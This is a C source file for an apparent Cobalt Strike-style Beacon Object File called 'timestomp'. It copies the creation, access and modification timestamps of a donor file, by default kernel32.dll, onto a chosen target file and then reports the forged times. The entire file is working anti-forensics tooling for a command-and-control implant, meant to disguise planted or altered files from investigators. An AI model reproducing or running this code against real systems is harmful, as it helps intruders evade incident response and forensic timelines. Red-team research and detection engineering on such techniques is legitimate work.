#include <windows.h>
#include "beacon_compat.h"

/* BOF-style imports */
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT UINT    WINAPI KERNEL32$GetSystemDirectoryW(LPWSTR, UINT);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$GetFileTime(HANDLE, LPFILETIME, LPFILETIME, LPFILETIME);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$SetFileTime(HANDLE, const FILETIME*, const FILETIME*, const FILETIME*);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FileTimeToSystemTime(const FILETIME*, LPSYSTEMTIME);

DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscat(wchar_t*, const wchar_t*);

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    char *target = BeaconDataExtract(&parser, NULL);
    char *donor  = BeaconDataExtract(&parser, NULL);

    if (!target || !*target) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: timestomp --target PATH [--donor PATH]\n");
        return;
    }

    /* Build donor path */
    wchar_t wDonor[MAX_PATH] = {0};
    if (donor && *donor) {
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, donor, -1, wDonor, MAX_PATH);
    } else {
        KERNEL32$GetSystemDirectoryW(wDonor, MAX_PATH);
        MSVCRT$wcscat(wDonor, L"\\kernel32.dll");
    }

    wchar_t wTarget[MAX_PATH] = {0};
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, MAX_PATH);

    /* Read timestamps from donor */
    HANDLE hDonor = KERNEL32$CreateFileW(wDonor, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hDonor == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open donor: %lu\n", KERNEL32$GetLastError());
        return;
    }

    FILETIME ftCreate, ftAccess, ftWrite;
    if (!KERNEL32$GetFileTime(hDonor, &ftCreate, &ftAccess, &ftWrite)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] GetFileTime failed: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hDonor);
        return;
    }
    KERNEL32$CloseHandle(hDonor);

    /* Apply to target */
    HANDLE hTarget = KERNEL32$CreateFileW(wTarget, FILE_WRITE_ATTRIBUTES,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);
    if (hTarget == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open target: %lu\n", KERNEL32$GetLastError());
        return;
    }

    if (!KERNEL32$SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SetFileTime failed: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hTarget);
        return;
    }
    KERNEL32$CloseHandle(hTarget);

    /* Format timestamps for display */
    SYSTEMTIME st;
    KERNEL32$FileTimeToSystemTime(&ftCreate, &st);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Timestomped: %s\n"
        "    Created:  %04d-%02d-%02d %02d:%02d:%02d\n",
        target,
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    KERNEL32$FileTimeToSystemTime(&ftWrite, &st);
    BeaconPrintf(CALLBACK_OUTPUT,
        "    Modified: %04d-%02d-%02d %02d:%02d:%02d\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}
